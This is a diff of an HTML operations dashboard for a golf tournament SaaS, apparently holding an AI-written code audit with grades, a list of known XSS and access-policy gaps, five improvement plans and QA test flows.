-<div class="table-wrap" style="margin-bottom:1.5rem;">
-  <table class="page-table">
-    <thead><tr><th>URL</th><th>File</th><th>Purpose</th></tr></thead>
-    <tbody>
-      <tr><td class="url">/</td><td class="file">marketing.html</td><td>Marketing landing page with embedded live demo</td></tr>
-      <tr><td class="url">/create</td><td class="file">create.html</td><td>Tournament creation wizard (billing gate)</td></tr>
-      <tr><td class="url">/login</td><td class="file">login.html</td><td>Auth: signup, magic link, password</td></tr>
-      <tr><td class="url">/install</td><td class="file">install.html</td><td>PWA install guide</td></tr>
-      <tr><td class="url">/player-upgrade</td><td class="file">player-upgrade.html</td><td>Player billing / Stripe checkout</td></tr>
-      <tr><td class="url">/champions</td><td class="file">champions.html</td><td>All-time champions hall of fame</td></tr>
-      <tr><td class="url">/feed</td><td class="file">feed.html</td><td>Cross-tournament activity feed</td></tr>
-      <tr><td class="url">/directory</td><td class="file">directory.html</td><td>Player directory across tournaments</td></tr>
-      <tr><td class="url">/platform</td><td class="file">platform.html</td><td>Ops hub — tenants, action board, artifacts, grades</td></tr>
-      <tr><td class="url">/platform/:slug</td><td class="file">{slug}.html</td><td>Catch-all for review/plan/audit artifacts</td></tr>
-    </tbody>
-  </table>
-</div>
-
-<div class="card-title" style="margin-bottom:0.75rem;">Tournament Pages</div>
-<div class="table-wrap" style="margin-bottom:1.5rem;">
-  <table class="page-table">
-    <thead><tr><th>URL</th><th>File</th><th>Purpose</th></tr></thead>
-    <tbody>
-      <tr><td class="url">/t/:slug/home</td><td class="file">home.html</td><td>Tournament home — RSVP, leaderboard, push subscribe</td></tr>
-      <tr><td class="url">/t/:slug/admin</td><td class="file">admin.html</td><td>Admin: players, scoring, rounds, Design tab (24 settings keys)</td></tr>
-      <tr><td class="url">/t/:slug/scoreboard</td><td class="file">scoreboard.html</td><td>Realtime leaderboard</td></tr>
-      <tr><td class="url">/t/:slug/scorecard</td><td class="file">scorecard.html</td><td>Per-player live scorecard input</td></tr>
-      <tr><td class="url">/t/:slug/feed</td><td class="file">feed.html</td><td>Trash talk + activity feed (tournament-scoped)</td></tr>
-      <tr><td class="url">/t/:slug/profile</td><td class="file">profile.html</td><td>Player profile + stats</td></tr>
-      <tr><td class="url">/t/:slug/course</td><td class="file">course.html</td><td>Course map + hole details</td></tr>
-      <tr><td class="url">/t/:slug/player</td><td class="file">player.html</td><td>Player management + billing status</td></tr>
-    </tbody>
-  </table>
-</div>
-
-<div class="grid-2">
-  <div class="card">
-    <div class="card-title">&#10003; Strengths</div>
-    <ul>
-      <li>11 versioned migrations with clean progression — no schema drift.</li>
-      <li><code>is_admin</code> column dropped (migration 006) — single source of truth in <code>tournament_admins</code> table.</li>
-      <li>Stripe end-to-end wired: <code>create-checkout</code> JWT-gated, <code>stripe-webhook</code> sig-verified, 4 event types handled, <code>tournaments.stripe_*</code> + <code>player_accounts.billing_status</code> columns in place.</li>
-      <li>Security headers correct: HSTS, X-Frame-Options, X-Content-Type, Referrer-Policy all present in vercel.json.</li>
-      <li>PWA at v34 — cache-first assets, JSON bypass, push notifications, 22 precached files.</li>
-      <li>UX sprint concluded (10a676f): login errors sanitized, skeleton shimmer live, aria-live, prefers-reduced-motion, overflow-x tables.</li>
-      <li>Self-documenting ops hub at /platform with grades.json tracking per-axis history across 13 reviews.</li>
-      <li>send-push v9 live with JWT auth + owner/admin gate.</li>
-      <li>Rounds model (migration 007) enables multi-day, multi-format tournament structures.</li>
-      <li><code>esc()</code> helper used consistently on player names in champions.html and feed.html.</li>
-    </ul>
+<!-- ═══════════════════════════════════════════════════
+     §1 — CODE-TO-BUSINESS AUDIT
+     ═══════════════════════════════════════════════════ -->
+<section class="axis-stage" id="review" data-date="2026-05-13" data-agent="claude-sonnet-4-6">
+  <div class="stage-header">
+    <span class="stage-pill pill-audit">Audit</span>
+    <span class="stage-date">May 13, 2026</span>
+    <span class="stage-agent">claude-sonnet-4-6</span>
   </div>
-  <div class="card">
-    <div class="card-title" style="color:var(--red);">&#9888; Gaps &amp; Real Bugs</div>
-    <ul>
-      <li><strong style="color:var(--red)">feed.html:377 — <code>_parseMentions(p.message)</code> rendered to <code>innerHTML</code> without <code>esc()</code>.</strong> Player-controlled message content → stored XSS on public feed page. Cited: grades.json security notes (May 8).</li>
-      <li><strong style="color:var(--orange)">admin.html:~2044 and ~2194 — <code>url</code> value rendered to <code>innerHTML</code>.</strong> If url field is player-controlled, XSS vector on admin page.</li>
-      <li><strong style="color:var(--orange)"><code>player_accounts</code> anon SELECT USING(true)</strong> — <code>005_invitations_and_accounts.sql:41</code>. Any unauthenticated user can read billing status, billing_ref for any player.</li>
-      <li><strong style="color:var(--orange)">CSP <code>unsafe-inline</code></strong> — nullifies XSS protection. Requires extracting inline <code>&lt;script&gt;</code> blocks to external files.</li>
-      <li><strong style="color:var(--orange)">SEND_INSTALL_EMAIL_SECRET not set</strong> — send-install-email v4 deployed but env var missing in Supabase dashboard. Rob must action manually.</li>
-      <li><strong style="color:var(--gold)">players/scores permissive read policies</strong> — pre-multi-tenant policies never tightened. Migration 001 deferred this explicitly but no subsequent migration addressed it.</li>
-      <li><strong style="color:var(--gold)">No CI/CD</strong> — edge function deploys require manual SUPABASE_ACCESS_TOKEN. No staging environment.</li>
-      <li><strong style="color:var(--gold)">Bova formats unconfirmed</strong> — Day 1=stroke, Day 2=scramble, Day 3=best_ball seeded but shambles not mapped to a day. Blocked on human verification.</li>
-      <li><strong style="color:var(--gold)">LLC not formed</strong> — Stripe live mode blocked. No ToS/Privacy pages. Zero revenue transacted.</li>
-    </ul>
-  </div>
-</div>
+  <div class="stage-body">
 
-</div>
+    <div class="section-label">§1 — Code-to-Business Audit</div>
+
+    <div class="overview-grid">
+      <div class="ov-card"><div class="ov-val grade-a">A</div><div class="ov-label">Architecture</div></div>
+      <div class="ov-card"><div class="ov-val grade-b">B+</div><div class="ov-label">Feature Depth</div></div>
+      <div class="ov-card"><div class="ov-val grade-b">B+</div><div class="ov-label">UX Polish</div></div>
+      <div class="ov-card"><div class="ov-val grade-b">B</div><div class="ov-label">Security</div></div>
+      <div class="ov-card"><div class="ov-val grade-b">B</div><div class="ov-label">Data Model</div></div>
+      <div class="ov-card"><div class="ov-val grade-b">B+</div><div class="ov-label">Deployment</div></div>
+      <div class="ov-card"><div class="ov-val grade-b">B</div><div class="ov-label">Performance</div></div>
+      <div class="ov-card"><div class="ov-val grade-c">C+</div><div class="ov-label">Business Ready</div></div>
+    </div>
+
+    <div class="card" style="margin-bottom:1.5rem;">
+      <div class="card-title">Platform Snapshot</div>
+      <p>TOURney is a multi-tenant golf tournament SaaS PWA. One live tenant (Bova Invitational). The Bova Invitational ran as a real 3-day event — it is now a reference tenant and proof-of-concept. The platform has 11 versioned migrations, a full edge function suite (Stripe, push, email), a self-documenting ops hub at <code>/platform</code>, and PWA cache at <code>tourney-v34</code>. LLC not yet formed; Stripe live keys not set. That is the entire pre-launch gap.</p>
+    </div>
+
+    <div class="section-label">Tech Stack</div>
+    <div class="grid-3" style="margin-bottom:1.5rem;">
+      <div class="stack-item"><div class="stack-label">Frontend</div><div class="stack-value">Vanilla JS MPA</div><div class="stack-note">No framework. Inline JS per page. 25+ HTML pages served static from Vercel.</div></div>
+      <div class="stack-item"><div class="stack-label">Backend / DB</div><div class="stack-value">Supabase</div><div class="stack-note">Project jllugkiojeoopitdvzsa. RLS on all tables. Realtime on scorecard.</div></div>
+      <div class="stack-item"><div class="stack-label">Hosting</div><div class="stack-value">Vercel (static)</div><div class="stack-note">tourney.greenskeeper.studio + bova.greenskeeper.studio. Full security headers.</div></div>
+      <div class="stack-item"><div class="stack-label">PWA Cache</div><div class="stack-value">tourney-v34</div><div class="stack-note">sw.js: cache-first assets, network-first HTML, JSON bypass. 22 precached files.</div></div>
+      <div class="stack-item"><div class="stack-label">Init Layer</div><div class="stack-value">tourney-init.js</div><div class="stack-note">Detects slug, fetches tournament row, injects brand, exposes window.tourney.db + window.tourney.ready.</div></div>
+      <div class="stack-item"><div class="stack-label">Routing</div><div class="stack-value">vercel.json rewrites</div><div class="stack-note">/t/:slug/* → per-page HTML. /platform/:slug catch-all for ops artifacts.</div></div>
+    </div>
+
+    <div class="section-label">Edge Functions</div>
+    <div class="grid-3" style="margin-bottom:1.5rem;">
+      <div class="stack-item"><div class="stack-label">create-checkout</div><div class="stack-value">Stripe Checkout Session</div><div class="stack-note">JWT-gated. Creates Stripe session for /player-upgrade. Secret key held server-side.</div></div>
+      <div class="stack-item"><div class="stack-label">stripe-webhook</div><div class="stack-value">Stripe → DB Sync</div><div class="stack-note">Sig-verified. 4 event types. Updates billing_status on player_accounts.</div></div>
+      <div class="stack-item"><div class="stack-label">create-player-checkout</div><div class="stack-value">Player Upgrade Flow</div><div class="stack-note">Secondary checkout entry for player billing path.</div></div>
+      <div class="stack-item"><div class="stack-label">send-push</div><div class="stack-value">Web Push Notifications</div><div class="stack-note">v9 deployed. JWT auth + owner/admin check. Sends to push_subscriptions for a tournament.</div></div>
+      <div class="stack-item"><div class="stack-label">send-install-email</div><div class="stack-value">Onboard Welcome Email</div><div class="stack-note">v6 deployed. Webhook gate via SEND_INSTALL_EMAIL_SECRET. Fires on players INSERT.</div></div>
+      <div class="stack-item"><div class="stack-label">platform-action</div><div class="stack-value">Owner Admin Actions</div><div class="stack-note">Owner-gated. comp/revoke/list player accounts. task_push/done/list for platform task queue.</div></div>
+    </div>
+
+    <div class="section-label">Database Tables (11 migrations)</div>
+    <div class="table-wrap" style="margin-bottom:1.5rem;">
+      <table class="page-table">
+        <thead><tr><th>Table</th><th>Migration</th><th>Key Columns</th><th>RLS Status</th></tr></thead>
+        <tbody>
+          <tr><td>tournaments</td><td><code>001</code></td><td><code>slug, tier, stripe_subscription_id, stripe_status, status, owner_email</code></td><td><span class="pill pill-gold">SELECT USING(true)</span></td></tr>
+          <tr><td>tournament_admins</td><td><code>001 + 004</code></td><td><code>tournament_id, email</code></td><td><span class="pill pill-gold">SELECT USING(true)</span></td></tr>
+          <tr><td>players</td><td><code>001</code></td><td><code>tournament_id, name, email, team, handicap, trash_talk, why_me</code></td><td><span class="pill pill-orange">Permissive — verify live</span></td></tr>
+          <tr><td>scores</td><td><code>001</code></td><td><code>tournament_id, player_id, round, hole, strokes</code></td><td><span class="pill pill-orange">Permissive — verify live</span></td></tr>
+          <tr><td>settings</td><td><code>001 + 003</code></td><td><code>tournament_id, key, value</code></td><td><span class="pill pill-green">Admin-gated write</span></td></tr>
+          <tr><td>invitations</td><td><code>005</code></td><td><code>tournament_id, email, code, used_at</code></td><td><span class="pill pill-green">Auth-gated read/write</span></td></tr>
+          <tr><td>player_accounts</td><td><code>005</code></td><td><code>email, plan, billing_status, billing_expires_at, billing_ref</code></td><td><span class="pill pill-red">anon SELECT USING(true) — P0 fix</span></td></tr>
+          <tr><td>push_subscriptions</td><td><code>005</code></td><td><code>tournament_id, endpoint, keys, user_agent</code></td><td><span class="pill pill-green">Auth-gated</span></td></tr>
+          <tr><td>trash_talk</td><td><code>004</code></td><td><code>tournament_id, player_id, message, created_at</code></td><td><span class="pill pill-gold">SELECT USING(true)</span></td></tr>
+          <tr><td>rounds</td><td><code>007</code></td><td><code>tournament_id, round_number, format, date, status</code></td><td><span class="pill pill-green">Owner/admin write (migration 011)</span></td></tr>
+          <tr><td>platform_tasks</td><td><code>010</code></td><td><code>source, queue, title, body, cmd, tag, status</code></td><td><span class="pill pill-gold">platform_owner via current_setting</span></td></tr>
+          <tr><td>qa_runs</td><td><code>010</code></td><td><code>slug, passed, total, notes</code></td><td><span class="pill pill-gold">platform_owner via current_setting</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="section-label">Platform Pages</div>
+    <div class="table-wrap" style="margin-bottom:1rem;">
+      <table class="page-table">
+        <thead><tr><th>URL</th><th>File</th><th>Purpose</th></tr></thead>
+        <tbody>
+          <tr><td><code>/</code></td><td><code>marketing.html</code></td><td>Public marketing — animated phone demo, pricing, /create CTA</td></tr>
+          <tr><td><code>/create</code></td><td><code>create.html</code></td><td>Tournament creation wizard — billing gate, slug picker, rounds config</td></tr>
+          <tr><td><code>/login</code></td><td><code>login.html</code></td><td>Auth — email/password + magic link</td></tr>
+          <tr><td><code>/platform</code></td><td><code>platform.html</code></td><td>Ops hub — tenants, action board, artifacts, grades, CEO tasks</td></tr>
+          <tr><td><code>/platform/:slug</code></td><td><code>{slug}.html</code></td><td>Catch-all for review/plan/audit artifacts</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="section-label">Tournament Pages</div>
+    <div class="table-wrap" style="margin-bottom:1.5rem;">
+      <table class="page-table">
+        <thead><tr><th>URL</th><th>File</th><th>Purpose</th></tr></thead>
+        <tbody>
+          <tr><td><code>/t/:slug/home</code></td><td><code>home.html</code></td><td>Tournament home — RSVP, leaderboard, push subscribe</td></tr>
+          <tr><td><code>/t/:slug/admin</code></td><td><code>admin.html</code></td><td>Admin: players, scoring, rounds, Design tab (24 settings keys)</td></tr>
+          <tr><td><code>/t/:slug/scoreboard</code></td><td><code>scoreboard.html</code></td><td>Realtime leaderboard</td></tr>
+          <tr><td><code>/t/:slug/scorecard</code></td><td><code>scorecard.html</code></td><td>Per-player live scorecard input</td></tr>
+          <tr><td><code>/t/:slug/feed</code></td><td><code>feed.html</code></td><td>Trash talk + activity feed</td></tr>
+          <tr><td><code>/t/:slug/profile</code></td><td><code>profile.html</code></td><td>Player profile + stats</td></tr>
+          <tr><td><code>/t/:slug/course</code></td><td><code>course.html</code></td><td>Course map + hole details</td></tr>
+          <tr><td><code>/t/:slug/player</code></td><td><code>player.html</code></td><td>Player management + billing status</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">&#10003; Strengths</div>
+        <ul>
+          <li>11 versioned migrations with clean progression — no schema drift.</li>
+          <li><code>is_admin</code> column dropped (migration 006) — single source of truth in <code>tournament_admins</code> table.</li>
+          <li>Stripe end-to-end wired: <code>create-checkout</code> JWT-gated, <code>stripe-webhook</code> sig-verified, 4 event types handled, <code>tournaments.stripe_*</code> + <code>player_accounts.billing_status</code> columns in place.</li>
+          <li>Security headers correct: HSTS, X-Frame-Options, X-Content-Type, Referrer-Policy all present in vercel.json.</li>
+          <li>PWA at v34 — cache-first assets, JSON bypass, push notifications, 22 precached files.</li>
+          <li>UX sprint concluded (10a676f): login errors sanitized, skeleton shimmer live, aria-live, prefers-reduced-motion, overflow-x tables.</li>
+          <li>Self-documenting ops hub at /platform with grades.json tracking per-axis history across 13 reviews.</li>
+          <li>send-push v9 live with JWT auth + owner/admin gate.</li>
+          <li>Rounds model (migration 007) enables multi-day, multi-format tournament structures.</li>
+          <li><code>esc()</code> helper used consistently on player names in champions.html and feed.html.</li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="card-title" style="color:var(--red);">&#9888; Gaps &amp; Real Bugs</div>
+        <ul>
+          <li><strong style="color:var(--red)">feed.html:377 — <code>_parseMentions(p.message)</code> to <code>innerHTML</code> without <code>esc()</code>.</strong> Stored XSS on public feed page.</li>
+          <li><strong style="color:var(--orange)">admin.html:~2044 and ~2194 — <code>url</code> rendered to <code>innerHTML</code>.</strong> XSS vector if url is player-controlled.</li>
+          <li><strong style="color:var(--orange)"><code>player_accounts</code> anon SELECT USING(true)</strong> — <code>005_invitations_and_accounts.sql:41</code>. Any unauthenticated user reads billing status.</li>
+          <li><strong style="color:var(--orange)">CSP <code>unsafe-inline</code></strong> — nullifies XSS protection. Inline scripts must be extracted.</li>
+          <li><strong style="color:var(--gold)">players/scores permissive read policies</strong> — pre-multi-tenant policies never tightened. Migration 001 deferred this; never addressed.</li>
+          <li><strong style="color:var(--gold)">No CI/CD</strong> — edge function deploys require manual SUPABASE_ACCESS_TOKEN. No staging environment.</li>
+          <li><strong style="color:var(--gold)">Bova formats unconfirmed</strong> — Day 1=stroke, Day 2=scramble, Day 3=best_ball seeded but shambles not mapped. Blocked on Chris Bova confirmation.</li>
+          <li><strong style="color:var(--gold)">LLC not formed</strong> — Stripe live mode blocked. No ToS/Privacy pages. Zero revenue transacted.</li>
+        </ul>
+      </div>
+    </div>
+
+  </div>
 </section>
 
-<section id="council">
-<div class="wrapper">
-
-<div class="section-header">
-  <div class="section-eyebrow">§2 — Council of 5</div>
-  <div class="section-title">Forward-Looking Polish Ideas</div>
-  <div class="section-desc">Five concrete improvements — grounded in what's already built, not wishlist thinking.</div>
-</div>
-
-<div style="display:grid;gap:1rem;">
-
-  <div class="idea-card idea-1">
-    <div class="idea-number">1</div>
-    <div class="idea-tag"><span class="pill pill-gold">Security + UX</span></div>
-    <div class="idea-title">Kill CSP unsafe-inline — Extract Inline Scripts to External Files</div>
-    <div class="idea-body">The CSP header exists but has <code>unsafe-inline</code>, which nullifies the XSS protection it's meant to provide. Every HTML page has substantial inline <code>&lt;script&gt;</code> blocks — that's the blocker. Extracting them unlocks a strict CSP, which in turn makes the <code>_parseMentions</code> and url innerHTML bugs unexploitable at the browser level even before the code fixes land.</div>
-    <div class="idea-why"><strong>Build plan:</strong> 1. Pick one low-complexity page (e.g. champions.html). 2. Move all <code>&lt;script&gt;</code> content to <code>champions.js</code>. 3. Add <code>nonce</code>-based CSP or hash the script. 4. Verify Vercel header updated. 5. Roll forward page by page over 1 sprint. Migration name: no migration needed — vercel.json CSP header update only.</div>
+<!-- ═══════════════════════════════════════════════════
+     §2 — COUNCIL OF 5
+     ═══════════════════════════════════════════════════ -->
+<section class="axis-stage" id="council" data-date="2026-05-13" data-agent="claude-sonnet-4-6">
+  <div class="stage-header">
+    <span class="stage-pill pill-council">Council</span>
+    <span class="stage-date">May 13, 2026</span>
+    <span class="stage-agent">claude-sonnet-4-6</span>
   </div>
+  <div class="stage-body">
 
-  <div class="idea-card idea-2">
-    <div class="idea-number">2</div>
-    <div class="idea-tag"><span class="pill pill-blue">Data + Business</span></div>
-    <div class="idea-title">Stripe Test-Mode Dry Run — End-to-End Billing Without LLC</div>
-    <div class="idea-body"><code>create-checkout</code> and <code>stripe-webhook</code> are fully wired — JWT auth, sig verification, 4 event types, DB columns all done. The only missing piece before LLC is pointing them at Stripe test keys. Running a full test-mode checkout → webhook → billing_status flow validates the entire pipeline before real money flows and surfaces any edge cases while the stakes are zero.</div>
-    <div class="idea-why"><strong>Build plan:</strong> 1. Create Stripe test account. 2. Set <code>STRIPE_SECRET_KEY</code> (test), <code>STRIPE_WEBHOOK_SECRET</code> (test), <code>STRIPE_PRICE_PLAYER</code> (test price ID) as Supabase edge function secrets. 3. Register webhook pointing at <code>jllugkiojeoopitdvzsa.supabase.co/functions/v1/stripe-webhook</code>. 4. Walk /player-upgrade full flow. 5. Confirm player_accounts.billing_status updates. No code changes needed.</div>
+    <div class="section-label">§2 — Council of 5 Forward-Looking Ideas</div>
+
+    <div class="phase-item idea-gold">
+      <div class="phase-header">
+        <span class="phase-title">1 — Kill CSP unsafe-inline: Extract Inline Scripts</span>
+        <span class="pill pill-gold">Security + UX</span>
+      </div>
+      <div class="phase-body">The CSP header exists but has <code>unsafe-inline</code>, which nullifies the XSS protection it's meant to provide. Every HTML page has substantial inline <code>&lt;script&gt;</code> blocks — that's the blocker. Extracting them unlocks a strict CSP, which in turn makes the <code>_parseMentions</code> and url innerHTML bugs unexploitable at the browser level even before the code fixes land.</div>
+      <div class="phase-ac">
+        <strong>Build Plan</strong>
+        <ul>
+          <li>Pick one low-complexity page (e.g. champions.html). Move all <code>&lt;script&gt;</code> content to <code>champions.js</code>.</li>
+          <li>Add <code>nonce</code>-based CSP or hash the script. Verify Vercel header updated.</li>
+          <li>Roll forward page by page over 1 sprint. Migration name: vercel.json CSP header update only.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="phase-item idea-blue">
+      <div class="phase-header">
+        <span class="phase-title">2 — Stripe Test-Mode Dry Run: End-to-End Billing Without LLC</span>
+        <span class="pill pill-blue">Data + Business</span>
+      </div>
+      <div class="phase-body"><code>create-checkout</code> and <code>stripe-webhook</code> are fully wired — JWT auth, sig verification, 4 event types, DB columns all done. The only missing piece before LLC is pointing them at Stripe test keys. Running a full test-mode checkout → webhook → billing_status flow validates the entire pipeline before real money flows.</div>
+      <div class="phase-ac">
+        <strong>Build Plan</strong>
+        <ul>
+          <li>Create Stripe test account. Set <code>STRIPE_SECRET_KEY</code> (test), <code>STRIPE_WEBHOOK_SECRET</code> (test), <code>STRIPE_PRICE_PLAYER</code> (test price ID) as Supabase edge fn secrets.</li>
+          <li>Register webhook at <code>jllugkiojeoopitdvzsa.supabase.co/functions/v1/stripe-webhook</code>.</li>
+          <li>Walk /player-upgrade full flow. Confirm <code>player_accounts.billing_status</code> updates. No code changes needed.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="phase-item idea-green">
+      <div class="phase-header">
+        <span class="phase-title">3 — Post-Round Score Summary Email via send-install-email Infrastructure</span>
+        <span class="pill pill-green">UX + Retention</span>
+      </div>
+      <div class="phase-body"><code>send-install-email</code> v6 is deployed and has the webhook gate pattern established. The same infrastructure can power a post-round email blast — "Round 1 complete. Leaderboard: 1. Smith (-4), 2. Jones (-2)..." Triggered from admin.html when an admin closes a round. This turns a one-time install nudge function into a reusable email engine.</div>
+      <div class="phase-ac">
+        <strong>Build Plan</strong>
+        <ul>
+          <li>Add <code>round_summary</code> event type to send-install-email function (new branch in switch).</li>
+          <li>Collect top-5 leaderboard data from rounds + scores query. Build HTML email template (dark gold TOURney theme).</li>
+          <li>In admin.html, add "Email Round Summary" button in Rounds tab that POSTs to the function. Deploy as v7. Estimated: 3h dev + 30min QA.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="phase-item idea-orange">
+      <div class="phase-header">
+        <span class="phase-title">4 — GitHub Actions Deploy Pipeline for Edge Functions</span>
+        <span class="pill pill-orange">Infrastructure</span>
+      </div>
+      <div class="phase-body">Currently, deploying edge functions requires a manual <code>SUPABASE_ACCESS_TOKEN</code> and CLI command. There's no CI/CD, no staging, and no deploy audit trail. As the function count grows (6 functions now), manual deploys are a reliability risk — wrong version, missed env var, no rollback path.</div>
+      <div class="phase-ac">
+        <strong>Build Plan</strong>
+        <ul>
+          <li>Add <code>.github/workflows/deploy-functions.yml</code>. Use <code>supabase/setup-cli</code> action.</li>
+          <li>Set <code>SUPABASE_ACCESS_TOKEN</code> + <code>SUPABASE_PROJECT_ID</code> as GitHub secrets.</li>
+          <li>Deploy all functions on push to main (path filter: <code>supabase/functions/**</code>). Add smoke-test step (curl the function, expect 200 or 401). Estimated: 2h setup.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="phase-item idea-purple">
+      <div class="phase-header">
+        <span class="phase-title">5 — ToS + Privacy Pages: Pre-Launch Legal Unblock</span>
+        <span class="pill pill-purple">Business</span>
+      </div>
+      <div class="phase-body">Absent ToS and Privacy Policy, TOURney has GDPR/CCPA exposure and Stripe will flag the business during account review. These are also conversion blockers — players and organizers making a payment decision want to see a Privacy Policy. The <code>/create</code> wizard billing gate already has a placeholder for a ToS link.</div>
+      <div class="phase-ac">
+        <strong>Build Plan</strong>
+        <ul>
+          <li>Write ToS: usage terms, payment terms, content policy, disclaimer. Write Privacy Policy: data collected, Supabase storage, Stripe processor relationship, no selling of data.</li>
+          <li>Add <code>tos.html</code> + <code>privacy.html</code> with TOURney design system. Add <code>/tos</code> + <code>/privacy</code> rewrites in vercel.json.</li>
+          <li>Link from /create wizard + marketing footer. Estimated: 2–3h total.</li>
+        </ul>
+      </div>
+    </div>
+
   </div>
-
-  <div class="idea-card idea-3">
-    <div class="idea-number">3</div>
-    <div class="idea-tag"><span class="pill pill-green">UX + Retention</span></div>
-    <div class="idea-title">Post-Round Score Summary Email via send-install-email Infrastructure</div>
-    <div class="idea-body"><code>send-install-email</code> v4 is deployed and has the webhook gate pattern established. The same infrastructure can power a post-round email blast — "Round 1 complete. Leaderboard: 1. Smith (-4), 2. Jones (-2)..." Triggered from admin.html when an admin closes a round. This turns a one-time install nudge function into a reusable email engine.</div>
-    <div class="idea-why"><strong>Build plan:</strong> 1. Add <code>round_summary</code> event type to send-install-email function (new branch in switch). 2. Collect top-5 leaderboard data from rounds + scores query. 3. Build HTML email template (dark gold TOURney theme). 4. In admin.html, add "Email Round Summary" button in Rounds tab that POSTs to the function. 5. Deploy as v5. Estimated: 3h dev + 30min QA.</div>
-  </div>
-
-  <div class="idea-card idea-4">
-    <div class="idea-number">4</div>
-    <div class="idea-tag"><span class="pill pill-orange">Infrastructure</span></div>
-    <div class="idea-title">GitHub Actions Deploy Pipeline for Edge Functions</div>
-    <div class="idea-body">Currently, deploying edge functions requires a manual <code>SUPABASE_ACCESS_TOKEN</code> and CLI command. There's no CI/CD, no staging, and no deploy audit trail. As the function count grows (5 functions now), manual deploys are a reliability risk — wrong version, missed env var, no rollback path. A GH Actions workflow would auto-deploy on push to <code>main</code> and validate the function responds post-deploy.</div>
-    <div class="idea-why"><strong>Build plan:</strong> 1. Add <code>.github/workflows/deploy-functions.yml</code>. 2. Use <code>supabase/setup-cli</code> action. 3. Set <code>SUPABASE_ACCESS_TOKEN</code> + <code>SUPABASE_PROJECT_ID</code> as GitHub secrets. 4. Deploy all functions on push to main (with path filter <code>supabase/functions/**</code>). 5. Add smoke-test step (curl the function, expect 200 or 401). Estimated: 2h setup.</div>
-  </div>
-
-  <div class="idea-card idea-5">
-    <div class="idea-number">5</div>
-    <div class="idea-tag"><span class="pill pill-purple">Business</span></div>
-    <div class="idea-title">ToS + Privacy Pages — Pre-Launch Legal Unblock</div>
-    <div class="idea-body">Absent ToS and Privacy Policy, TOURney has GDPR/CCPA exposure and Stripe will flag the business during account review. These are also conversion blockers — players and tournament organizers making a payment decision want to see a Privacy Policy. The <code>/create</code> wizard billing gate already has a placeholder for a ToS link. This is a 2-hour task that unblocks Stripe activation.</div>
-    <div class="idea-why"><strong>Build plan:</strong> 1. Write ToS: usage terms, payment terms, content policy, disclaimer. 2. Write Privacy Policy: data collected (email, name, scores), Supabase storage, Stripe processor relationship, no selling of data. 3. Add <code>tos.html</code> + <code>privacy.html</code> with TOURney design system. 4. Add <code>/tos</code> + <code>/privacy</code> rewrites in vercel.json. 5. Link from /create wizard + marketing footer. Estimated: 2–3h total.</div>
-  </div>
-
-</div>
-
-</div>
 </section>
 
-<section id="qa">
-<div class="wrapper">
+<!-- ═══════════════════════════════════════════════════
+     §3 — QA PROTOCOL
+     ═══════════════════════════════════════════════════ -->
+<section class="axis-stage" id="qa" data-date="2026-05-13" data-agent="claude-sonnet-4-6">
+  <div class="stage-header">
+    <span class="stage-pill pill-qa">QA</span>
+    <span class="stage-date">May 13, 2026</span>
+    <span class="stage-agent">claude-sonnet-4-6</span>
+  </div>
+  <div class="stage-body">
 
-<div class="section-header">
-  <div class="section-eyebrow">§3 — QA Protocol</div>
-  <div class="section-title">Full Test Flows</div>
-  <div class="section-desc">Four flows: Platform, Player, Admin, PWA/Mobile. Walk each in order. Log bugs in the tracker below.</div>
-</div>
+    <div class="section-label">§3 — Full Test Flows</div>
 
-<div class="card-title" style="margin-bottom:0.75rem;">Flow A — Platform / Marketing</div>
-<div class="qa-flow" style="margin-bottom:2rem;">
-  <div class="qa-step">
-    <div class="qa-step-title">Marketing Landing Page ( / )</div>
-    <div class="qa-step-desc">Verify the public marketing page loads correctly and the demo embed works.</div>
-    <ul class="qa-step-checks">
-      <li>Page loads with no console errors or 4xx/5xx.</li>
-      <li>Hero headline renders. CTA "Start Your Tournament" visible.</li>
-      <li>Embedded live demo section loads Bova Invitational data.</li>
-      <li>Pricing section visible. "Get Started" links to /create.</li>
-      <li>OG meta tags present (check DevTools → Elements → head).</li>
-    </ul>
-  </div>
-  <div class="qa-step">
-    <div class="qa-step-title">Tournament Creation Wizard ( /create )</div>
-    <div class="qa-step-desc">Walk the full creation flow up to billing gate.</div>
-    <ul class="qa-step-checks">
-      <li>Form renders. All fields present: name, slug, format, dates.</li>
-      <li>Slug validation fires on blur — rejects spaces, special chars.</li>
-      <li>Submit hits billing gate if not logged in — redirect to /login.</li>
-      <li>No Supabase key exposed in page source (grep for <code>eyJ</code>).</li>
-    </ul>
-  </div>
-  <div class="qa-step">
-    <div class="qa-step-title">Ops Hub ( /platform )</div>
-    <div class="qa-step-desc">Verify the internal dashboard loads and renders data correctly.</div>
-    <ul class="qa-step-checks">
-      <li>Login gate active — redirects non-authenticated users.</li>
-      <li>Tenants tab loads and displays tournament list.</li>
-      <li>Artifacts tab renders qa-index.json entries as cards.</li>
-      <li>Grades scorecard shows per-axis letter grades from grades.json.</li>
-      <li>Action Board renders CEO task list correctly.</li>
-      <li>This review entry (5-13-26-claude-review) appears in Artifacts tab.</li>
-    </ul>
-  </div>
-</div>
+    <div class="card" style="margin-bottom:1rem;">
+      <div class="card-title">Flow A — Platform / Marketing</div>
+      <div class="qa-step">
+        <div class="qa-step-title">Marketing Landing Page ( / )</div>
+        <div class="qa-step-desc">Verify the public marketing page loads correctly and the demo embed works.</div>
+        <ul class="qa-checks">
+          <li>Page loads with no console errors or 4xx/5xx.</li>
+          <li>Hero headline renders. CTA "Start Your Tournament" visible.</li>
+          <li>Embedded live demo section loads Bova Invitational data.</li>
+          <li>Pricing section visible. "Get Started" links to /create.</li>
+          <li>OG meta tags present (check DevTools → Elements → head).</li>
+        </ul>
+      </div>
+      <div class="qa-step">
+        <div class="qa-step-title">Tournament Creation Wizard ( /create )</div>
+        <div class="qa-step-desc">Walk the full creation flow up to billing gate.</div>
+        <ul class="qa-checks">
+          <li>Form renders. All fields present: name, slug, format, dates.</li>
+          <li>Slug validation fires on blur — rejects spaces, special chars.</li>
+          <li>Submit hits billing gate if not logged in — redirect to /login.</li>
